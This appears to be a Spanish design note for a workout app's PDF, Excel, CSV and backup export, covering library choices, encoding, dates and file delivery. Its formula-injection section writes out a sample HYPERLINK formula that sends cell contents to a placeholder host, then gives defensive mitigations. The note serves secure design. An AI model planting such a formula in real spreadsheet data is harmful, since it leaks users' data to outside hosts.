# Exportacion: PDF, Excel y respaldo

Entra en la fase 8. Ver [plan.md](plan.md).

Ambos exportadores viven en `src/services/`, leen de la capa de dominio y **nunca de
un hook de React**, y comparten un unico saneador de texto y un unico `saveBlob()`.
Los dos motores se cargan con `import()` diferido para no engordar el arranque.

## PDF de la rutina

**jsPDF 3.x + jspdf-autotable 5.x**, ~130 KB gzip.

| Alternativa         | Peso        | Por que se descarta                                                            |
| ------------------- | ----------- | ------------------------------------------------------------------------------ |
| pdfmake             | ~750 KB     | 5,7 veces mas peso para resolver Unicode no latino, que este producto no tiene |
| @react-pdf/renderer | ~600-900 KB | El mas pesado, y encima la tabla y su paginacion hay que montarlas a mano      |
| `window.print()`    | 0 KB        | Ver abajo                                                                      |

`window.print()` es gratis y aun asi no sirve aqui: el navegador mete su propia URL,
su fecha en formato del sistema operativo y su paginacion en el papel, sin respetar
el idioma activo. En la PWA instalada en iOS el flujo real es Compartir, Imprimir,
pellizcar para previsualizar y volver a Compartir, que no descubre casi nadie. Y
reutilizar los estilos de pantalla no funciona: los 23 elementos con
`backdrop-filter` y los `rgba(255,255,255,x)` son ilegibles en papel, asi que
habria que escribir una hoja de impresion aparte de todas formas.

**Sobre los acentos.** Las 14 fuentes base de jsPDF se codifican en WinAnsi/cp1252,
que cubre las vocales acentuadas, la ene, la dieresis, los signos de apertura y el
simbolo `x` (U+00D7). Lo que queda fuera son flechas, casillas y emoji: por eso las
casillas de anotar se dibujan como rectangulos, no como caracteres.

**El documento.** Nombre de la rutina, fecha, y una tabla con cada ejercicio, su
grupo muscular y **casillas vacias para anotar peso y repeticiones en el gimnasio**.
`autoTable` resuelve la paginacion: cabecera repetida en cada pagina y filas que no
se parten.

**Idioma si, tema no.** El PDF respeta el idioma activo. Nunca el tema oscuro: el
papel es blanco siempre, y por eso existe `--color-surface-solid`.

## Excel

**exceljs 4.4.x**, con carga diferida. Un libro con hojas de Ejercicios, Rutinas, la
relacion entre ambas, y Series, mas una hoja de Metadatos con la version del esquema
y la zona horaria.

**SheetJS queda descartada por cadena de suministro.** La ultima version publicada en
el registro de npm es 0.18.5, de 2022, y arrastra CVE-2023-30533 (contaminacion de
prototipo) y CVE-2024-22363 (ReDoS). Ninguna de las dos correcciones esta en npm:
la distribucion oficial se movio a un CDN propio, lo que obliga a fijar una URL de
tarball en `package.json`. Eso anula `npm audit`, rompe Dependabot y hace fallar
`npm ci` sin red.

**CSV con BOM UTF-8 como respaldo**, cero dependencias. Se mantiene porque es el
unico exportador que sigue funcionando si el chunk de exceljs no se descarga
(sin cobertura en el gimnasio), y porque es a lo que se recurre si los datos estan
tan corruptos que ni el modelo se puede construir. Exporta una hoja por clic, porque
los navegadores bloquean las descargas encadenadas.

### Los cuatro problemas clasicos

**1. Codificacion y delimitador (solo CSV).** Excel en Windows, al abrir un `.csv`
con doble clic, asume la pagina de codigos ANSI si no encuentra BOM, y `Máquina` se
ve como `MÃ¡quina`. Pero el BOM solo no basta: en un Windows con configuracion
regional espanola el separador de lista es `;`, asi que un CSV con comas cae entero
en la columna A. El delimitador se elige por locale (`;` para `es`, `,` para `en`) y
va emparejado con el separador decimal. Terminador `\r\n`. En XLSX no aplica: es un
ZIP de XML declarado en UTF-8.

**2. Fechas como fecha real.** En XLSX una fecha es un numero de serie mas un formato;
escribir la cadena ISO la deja como texto y no se puede ordenar ni agrupar. Se
escribe un objeto `Date` con `numFmt`. Detalle importante: los ISO que guarda la app
llevan `Z`, y XLSX no tiene concepto de zona horaria, asi que un `Date` escrito tal
cual aparece desplazado. Se escribe la hora de pared local y se declara la zona en
Metadatos para que el desplazamiento sea reversible.

**3. Numeros sin localizar en XLSX.** Un peso se escribe como numero crudo (`82.5`) y
Excel lo muestra segun la configuracion de quien lo abre. Convertirlo a texto
(`"82,5"`) lo vuelve una cadena y rompe toda suma, grafica o tabla dinamica: es un
error frecuente y es exactamente lo contrario de lo correcto. La unidad va en el
encabezado (`Peso (kg)`), nunca dentro de la celda.

**4. Inyeccion de formulas.** Riesgo real: hoy la unica validacion de un nombre es
`name.trim()`, asi que nada impide llamar a una rutina
`=HYPERLINK("https://ejemplo/?d="&A2,"Abrir")`. Al abrir el libro, Excel evalua la
celda y puede exfiltrar el contenido de otras celdas cuando el usuario comparte el
fichero. Mitigacion en tres capas:

- **XLSX**: se escriben siempre celdas de tipo cadena, y se marcan las columnas de
  texto con `numFmt: '@'` para que Excel no reinterprete al reabrir.
- **CSV**: se prefija con apostrofo solo cuando el valor empieza por `=`, `+`, `-`,
  `@`, tabulador, CR o LF.
- **Saneo previo comun**: el mismo de [validation.md](validation.md), que elimina
  caracteres de control y marcas invisibles.

No se confia en la Vista Protegida de Excel: solo se activa para ficheros marcados
como venidos de internet, y uno generado en local por la propia PWA no lo esta.

## Entrega del fichero

`saveBlob()` centraliza la entrega de PDF, XLSX y CSV.

En movil, si `navigator.canShare({files})` lo permite, se usa `navigator.share()`,
que ademas es el flujo que pide el caso de uso real: mandar el PDF de la rutina a
WhatsApp, a Archivos o a la impresora del gimnasio. En la PWA instalada un
`<a download>` puede abrir el fichero en la propia ventana y sacar al usuario de la
aplicacion.

Detalle que importa: `navigator.share()` exige activacion transitoria del usuario, y
un `await` largo la consume. Por eso el chunk del motor se precarga al montar la
pantalla, para que en el clic el `import()` ya este resuelto. Si aun asi se perdio la
activacion, cae a la descarga clasica en lugar de fallar.

Nombres de fichero, sin acentos y con fecha ISO para que ordenen cronologicamente en
cualquier idioma:

```
lomito-train_rutina_empuje_2026-08-25.pdf
lomito-train_datos_2026-08-25.xlsx
```

## Respaldo completo

`backup.js` exporta e importa un JSON validado contra su esquema, con la version
incluida. Es la unica via de portar los datos entre dispositivos, y la que ofrece la
pantalla de recuperacion cuando una migracion falla.
